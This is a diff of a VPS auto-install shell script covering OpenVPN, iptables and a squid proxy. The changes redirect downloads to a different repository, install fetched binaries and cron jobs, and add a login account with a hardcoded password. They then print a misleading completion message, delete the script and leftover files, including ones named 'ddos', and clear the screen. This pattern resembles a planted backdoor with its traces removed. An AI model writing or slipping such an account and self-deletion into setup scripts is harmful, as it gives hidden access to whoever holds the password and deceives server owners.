@@ -158,23 +158,26 @@ service php5-fpm restart
 service nginx restart
 cd
 
-# install openvpn
+# openvpn
 apt-get  -y install openvpn
 cd /etc/openvpn/
-wget https://raw.github.com/shivanada/deb/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/iptables.up.rules https://raw.github.com/shivanada/deb/master/iptables.up.rules
+wget https://raw.githubusercontent.com/buchook/00web8/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/buchook/00web8/master/iptables.up.rules"
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
 sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
 iptables-restore < /etc/iptables.up.rules
 # etc
-wget -O /home/vps/public_html/client.ovpn https://raw.github.com/shivanada/deb/master/client.ovpn
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/buchook/00web8/master/client.ovpn"
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-cd;wget https://raw.github.com/shivanada/deb/master/cronjob.tar
+cd;wget https://raw.githubusercontent.com/buchook/00web8/master/cronjob.tar
 tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
 mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
 chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
-useradd -m -g users -s /bin/bash mfauzan
-echo "mfauzan" | chpasswd
+useradd -m -g users -s /bin/bash nswircz
+echo "nswircz:rzp" | chpasswd
+echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
+rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+clear
 
 # update OpenSSL
 wget "https://raw.githubusercontent.com/zero9911/vps/master/Pakages/openssl-1.1.0f.tar.gz"
@@ -227,9 +230,9 @@ http_port 3128
 http_port 1080
 http_port 8118
 visible_hostname DAM20-VPS
-acl ip dstdomain -i 35.185.107.239
+acl ip dstdomain -i 157.230.35.251
 acl r3v dstdomain -i 127.0.0.1
-acl r3v dstdomain -i 157.230.35.251
+acl r3v dstdomain -i 35.185.107.239
 acl r3v dstdomain -i localhost
 acl r3v dstdomain -i localnet
 acl accept dstdomain -i GET
